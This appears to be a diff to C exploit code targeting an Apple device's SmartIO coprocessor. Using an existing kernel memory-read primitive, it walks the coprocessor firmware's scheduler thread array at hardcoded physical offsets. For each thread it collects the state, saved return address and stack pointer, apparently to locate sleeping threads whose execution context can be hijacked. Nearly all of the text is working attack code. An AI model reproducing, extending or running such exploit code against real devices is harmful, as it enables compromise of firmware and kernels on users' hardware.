@@ -605,47 +605,72 @@ find_sleeping_threads(struct rtk_thread_info *threads, int *count)
     fprintf(stderr, "[*] Carveout: phys 0x%llx, size 0x%llx\n",
             smartio_carveout_phys, smartio_carveout_size);
 
-    /* Strategy 1: Walk thread list */
-    uint64_t thread_list_phys = smartio_carveout_phys + 0x113560;
-    uint64_t current_threads_phys = smartio_carveout_phys + 0x1cfe0;
+    /*
+     * Strategy 1: Walk the priority-indexed thread array at 0x112da0.
+     *
+     * The scheduler uses this array for dispatch:
+     *   0x112d90: 64-bit ready bitmask (bit N set = priority N has runnable thread)
+     *   0x112da0: array of [thread_VA(8), ?(8)] entries, 16 bytes each
+     *             indexed by priority (0..63)
+     *
+     * Each entry's first 8 bytes is a SmartIO VA pointing to the thread struct.
+     * We convert to physical: phys = carveout_base + smartio_va
+     * Then read thread+0x48 for the context buffer pointer.
+     * Then read the context buffer for saved ELR.
+     *
+     * We're looking for threads with state byte +0x2A != 0 (sleeping/blocked).
+     */
+    uint64_t thread_array_phys = smartio_carveout_phys + 0x112da0;
+    uint64_t ready_bitmask = kread64(smartio_carveout_phys + 0x112d90);
 
-    for (int i = 0; i < MAX_THREADS && *count < MAX_THREADS; i++) {
-        uint64_t thread_phys = thread_list_phys + (i * RTK_THREAD_SIZE);
+    fprintf(stderr, "[*] Ready bitmask: 0x%llx\n", ready_bitmask);
 
-        /* Read first word to check if thread entry is valid (non-zero) */
-        uint64_t thread_word0 = kread64(thread_phys);
-        if (thread_word0 == 0)
+    for (int prio = 0; prio < 64 && *count < MAX_THREADS; prio++) {
+        uint64_t entry_phys = thread_array_phys + prio * 16;
+        uint64_t thread_va = kread64(entry_phys);
+        if (thread_va == 0)
             continue;
 
+        /* Convert SmartIO VA to AP physical address */
+        uint64_t thread_phys = smartio_carveout_phys + thread_va;
+
+        /* Read state byte at +0x2A */
+        uint8_t state;
+        kread(thread_phys + RTK_THREAD_STATE, &state, 1);
+
         /* Read frame pointer from thread+0x48 */
-        uint64_t frame_ptr = kread64(thread_phys + RTK_THREAD_FRAME_PTR);
-        if (frame_ptr == 0 || frame_ptr < 0x200)
+        uint64_t frame_va = kread64(thread_phys + RTK_THREAD_FRAME_PTR);
+        if (frame_va == 0 || frame_va < 0x200)
             continue;
 
         /*
-         * frame_ptr is a SmartIO VA. Convert to AP physical:
+         * frame_va is a SmartIO VA. Convert to AP physical:
          *   phys = carveout_base + smartio_va
          *
-         * Read the saved ELR (return PC) from the exception frame.
+         * Read the saved ELR (return PC) from the context buffer.
          * A sleeping thread's ELR points into firmware code.
          */
-        uint64_t frame_phys = smartio_carveout_phys + frame_ptr;
+        uint64_t frame_phys = smartio_carveout_phys + frame_va;
         uint64_t saved_elr = kread64(frame_phys + EXC_FRAME_ELR);
+
+        int is_runnable = (ready_bitmask >> prio) & 1;
 
         /* Validate: ELR should be in SmartIO __TEXT (0x200..0x1c000) */
         if (saved_elr > 0x200 && saved_elr < 0x1c000) {
-            uint64_t saved_x0 = kread64(frame_phys + EXC_FRAME_X0);
             uint64_t saved_sp = kread64(frame_phys + EXC_FRAME_ORIG_SP);
 
             threads[*count].stack_base_phys = frame_phys + EXC_FRAME_SIZE_SVC;
             threads[*count].frame_phys = frame_phys;
             threads[*count].saved_pc = saved_elr;
             threads[*count].saved_sp = saved_sp;
-            threads[*count].is_sleeping = 1;
+            threads[*count].is_sleeping = (state != 0);
             (*count)++;
 
-            fprintf(stderr, "[+] Thread %d: frame@phys:0x%llx ELR=0x%llx SP=0x%llx\n",
-                    *count, frame_phys, saved_elr, saved_sp);
+            fprintf(stderr, "[+] Prio %d: thread@VA:0x%llx frame@phys:0x%llx "
+                    "ELR=0x%llx state=0x%02x %s\n",
+                    prio, thread_va, frame_phys, saved_elr, state,
+                    state != 0 ? "(SLEEPING)" :
+                    is_runnable ? "(RUNNABLE)" : "(idle)");
         }
     }
 
